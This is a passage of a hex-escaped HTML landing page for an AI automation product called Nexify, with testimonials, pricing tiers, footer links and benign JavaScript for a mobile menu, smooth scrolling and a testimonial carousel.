x20thousands\x20of\x20builders\x20who\x20ship\x20faster\x20with\x20Nexify.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22testimonial-slider\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22testimonial\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22testimonial-text\x22>“Nexify\x20turned\x20our\x20AI\x20pilots\x20into\x20production‑ready\x20systems\x20within\x206\x20weeks.\x20The\x20visual\x20workflow\x20builder\x20made\x20collaboration\x20between\x20ML\x20engineers\x20and\x20product\x20teams\x20seamless.”</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22testimonial-author\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22author-avatar\x22>DR</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22author-info\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h4>Dr.\x20Elena\x20Rossi</h4>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Head\x20of\x20AI,\x20Vectra\x20Health</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20</section>\x0a\x0a\x20\x20\x20\x20<section\x20class=\x22pricing\x22\x20id=\x22pricing\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22section-title\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h2>Simple\x20plans,\x20limitless\x20potential</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Start\x20free,\x20upgrade\x20when\x20you\x20grow.\x20All\x20plans\x20include\x20core\x20AI\x20building\x20blocks.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22pricing-grid\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22pricing-card\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3\x20class=\x22plan-name\x22>Starter</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22plan-price\x22>$39<span>/month</span></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<ul\x20class=\x22plan-features\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Up\x20to\x205\x20team\x20members</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>20\x20GB\x20vector\x20storage</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Pre‑built\x20AI\x20components</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Community\x20support</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>2\x20production\x20apps</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</ul>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20class=\x22secondary-button\x22>Start\x20free\x20trial</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22pricing-card\x20featured\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22featured-badge\x22>🔥\x20Most\x20popular</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3\x20class=\x22plan-name\x22>Pro</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22plan-price\x22>$99<span>/month</span></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<ul\x20class=\x22plan-features\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Up\x20to\x2020\x20members</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>200\x20GB\x20+\x20vector\x20DB</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>All\x20LLM\x20models\x20&\x20fine‑tuning</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Priority\x20chat\x20support</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Unlimited\x20apps\x20+\x20API\x20access</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Custom\x20prompt\x20libraries</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</ul>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20class=\x22cta-button\x22>Try\x2014\x20days\x20free</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22pricing-card\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3\x20class=\x22plan-name\x22>Enterprise</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22plan-price\x22>Custom</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<ul\x20class=\x22plan-features\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Unlimited\x20seats</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Unlimited\x20storage\x20&\x20throughput</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>SLA\x2099.9%\x20uptime</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>24/7\x20dedicated\x20support</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>On‑prem\x20/\x20VPC\x20deployment</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Custom\x20AI\x20model\x20hosting</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</ul>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20class=\x22secondary-button\x22>Contact\x20sales</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20</section>\x0a\x0a\x20\x20\x20\x20<section\x20class=\x22cta-section\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h2>Launch\x20your\x20first\x20AI\x20agent\x20today</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>No\x20credit\x20card\x20required.\x20Build,\x20test,\x20and\x20deploy\x20intelligent\x20workflows\x20in\x20minutes\x20—\x20not\x20months.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20class=\x22cta-button\x22>Get\x20started\x20for\x20free\x20→</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20</section>\x0a\x0a\x20\x20\x20\x20<footer>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22footer-content\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22footer-column\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22logo\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22logo-icon\x22><i\x20class=\x22fas\x20fa-robot\x22></i></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22logo-text\x22>Nex<span>ify</span></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20style=\x22margin-top:\x2020px;\x20color:\x20#b9bad2;\x22>The\x20modern\x20AI\x20automation\x20suite\x20built\x20for\x20business\x20&\x20engineering\x20teams.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22footer-column\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Platform</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<ul\x20class=\x22footer-links\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li><a\x20href=\x22#\x22>Features</a></li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li><a\x20href=\x22#\x22>Integrations</a></li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li><a\x20href=\x22#\x22>AI\x20models</a></li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li><a\x20href=\x22#\x22>Security</a></li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li><a\x20href=\x22#\x22>Roadmap</a></li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</ul>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22footer-column\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Resources</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<ul\x20class=\x22footer-links\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li><a\x20href=\x22#\x22>Documentation</a></li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li><a\x20href=\x22#\x22>Guides\x20&\x20tutorials</a></li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li><a\x20href=\x22#\x22>Blog</a></li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li><a\x20href=\x22#\x22>Community</a></li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li><a\x20href=\x22#\x22>API\x20reference</a></li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</ul>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22footer-column\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Company</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<ul\x20class=\x22footer-links\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li><a\x20href=\x22#\x22>About\x20Nexify</a></li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li><a\x20href=\x22#\x22>Careers</a></li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li><a\x20href=\x22#\x22>Press</a></li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li><a\x20href=\x22#\x22>Privacy\x20&\x20terms</a></li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li><a\x20href=\x22#\x22>Contact</a></li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</ul>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22copyright\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>&copy;\x202025\x20Nexify.\x20All\x20rights\x20reserved.\x20Intelligent\x20automation\x20for\x20everyone.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20</footer>\x0a\x0a\x20\x20\x20\x20<script>\x0a\x20\x20\x20\x20\x20\x20\x20\x20(function(){\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20//\x20Mobile\x20menu\x20toggle\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20mobileBtn\x20=\x20document.querySelector(\x27.mobile-menu-btn\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20navLinks\x20=\x20document.querySelector(\x27.nav-links\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if(mobileBtn)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20mobileBtn.addEventListener(\x27click\x27,\x20function(e)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20e.stopPropagation();\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if(navLinks.style.display\x20===\x20\x27flex\x27)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20navLinks.style.display\x20=\x20\x27none\x27;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x20else\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20navLinks.style.display\x20=\x20\x27flex\x27;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if(window.innerWidth\x20<=\x20768)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20navLinks.style.flexDirection\x20=\x20\x27column\x27;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20navLinks.style.position\x20=\x20\x27absolute\x27;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20navLinks.style.top\x20=\x20\x2780px\x27;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20navLinks.style.left\x20=\x20\x270\x27;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20navLinks.style.width\x20=\x20\x27100%\x27;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20navLinks.style.backgroundColor\x20=\x20\x27#ffffff\x27;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20navLinks.style.padding\x20=\x20\x2728px\x2024px\x27;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20navLinks.style.boxShadow\x20=\x20\x270\x2020px\x2030px\x20rgba(0,0,0,0.08)\x27;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20navLinks.style.gap\x20=\x20\x2724px\x27;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20navLinks.style.borderBottom\x20=\x20\x271px\x20solid\x20#ede6ff\x27;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20listItems\x20=\x20document.querySelectorAll(\x27.nav-links\x20li\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20listItems.forEach(li\x20=>\x20li.style.margin\x20=\x20\x270\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20});\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20//\x20Smooth\x20scroll\x20+\x20close\x20mobile\x20menu\x20on\x20anchor\x20click\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20document.querySelectorAll(\x27a[href^=\x22#\x22]\x27).forEach(anchor\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20anchor.addEventListener(\x27click\x27,\x20function(e)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20targetId\x20=\x20this.getAttribute(\x27href\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if(targetId\x20===\x20\x27#\x27)\x20return;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20target\x20=\x20document.querySelector(targetId);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if(target)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20e.preventDefault();\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20window.scrollTo({\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20top:\x20target.offsetTop\x20-\x2080,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20behavior:\x20\x27smooth\x27\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20});\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if(window.innerWidth\x20<=\x20768\x20&&\x20navLinks)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20navLinks.style.display\x20=\x20\x27none\x27;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20});\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20});\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20//\x20Testimonial\x20carousel\x20(rotating\x20content)\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20testimonialData\x20=\x20[\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20{\x20text:\x20\x22Nexify\x20turned\x20our\x20AI\x20pilots\x20into\x20production\x5cu2011ready\x20systems\x20within\x206\x20weeks.\x20The\x20visual\x20workflow\x20builder\x20made\x20collaboration\x20between\x20ML\x20engineers\x20and\x20product\x20teams\x20seamless.\x22,\x20name:\x20\x22Dr.\x20Elena\x20Rossi\x22,\x20position:\x20\x22Head\x20of\x20AI,\x20Vectra\x20Health\x22,\x20initials:\x20\x22ER\x22\x20},\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20{\x20text:\x20\x22We\x20automated\x2080%\x20of\x20customer\x20support\x20queries\x20using\x20Nexify\x5cu2019s\x20LLM\x20pipelines.\x20The\x20no\x5cu2011code\x20connectors\x20saved\x20months\x20of\x20backend\x20work.\x20Absolute\x20game\x20changer.\x22,\x20name:\x20\x22Marcus\x20Velez\x22,\x20position:\x20\x22VP\x20of\x20Product,\x20Supportly\x22,\x20initials:\x20\x22MV\x22\x20},\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20{\x20text:\x20\x22As\x20a\x20creative\x20agency,\x20we\x20now\x20prototype\x20AI\x20features\x20in\x20days\x20instead\x20of\x20months.\x20Nexify\x20gives\x20us\x20the\x20freedom\x20to\x20experiment\x20and\x20scale\x20instantly.\x22,\x20name:\x20\x22Sofia\x20Nakamura\x22,\x20position:\x20\x22Creative\x20Director,\x20Naked\x20Studio\x22,\x20initials:\x20\x22SN\x22\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20];\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20let\x20currentIdx\x20=\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20testimonialContainer\x20=\x20document.querySelector(\x27.testimonial\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20function\x20updateTestimonial()\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if(!testimonialContainer)\x20return;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20t\x20=\x20testimonialData[currentIdx];\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\